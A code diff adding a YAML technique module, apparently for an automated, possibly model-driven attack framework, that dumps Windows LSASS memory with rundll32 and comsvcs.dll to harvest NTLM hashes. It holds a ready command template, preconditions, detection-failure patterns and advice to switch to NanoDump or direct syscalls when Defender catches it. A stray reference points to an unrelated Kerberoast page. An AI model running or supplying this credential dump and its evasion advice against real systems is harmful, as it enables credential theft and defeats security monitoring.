@@ -1,0 +1,34 @@
+name: lsass_comsvcs
+category: creds
+description: LOLBIN LSASS dump via comsvcs.dll MiniDump — no external binary
+preconditions:
+- shell_obtained
+- is_local_admin
+- se_debug_privilege
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: powershell -c "$p = (Get-Process lsass).Id; rundll32 C:\\Windows\\System32\\comsvcs.dll
+  MiniDump $p C:\\Windows\\Temp\\l.dmp full"
+parser: generic_parser
+expected_effects:
+- lsass_dump_obtained
+- ntlm_hashes_obtained
+- has_hash
+falsifier:
+  pattern: ACCESS_DENIED|RunAsPPL|credential guard|defender detected
+  timeout: 30
+model_tier: haiku
+mechanism: 'comsvcs.dll exports MiniDump (Windows COM+ Services). rundll32 loads it
+  and calls
+
+  MiniDumpWriteDump against lsass — entirely LOLBIN, no dropped tooling. Signature
+
+  still tripped by Defender''s AMSI rules; use NanoDump or direct syscall variant
+
+  if detection trips.
+
+  '
+references:
+  ocd_mindmap: 'Branch 10: LSASS dump (comsvcs.dll LOLBIN)'
+  hacktricks: windows-hardening/stealing-credentials/
+hacktricks_ref: windows-hardening/active-directory-methodology/kerberoast.md
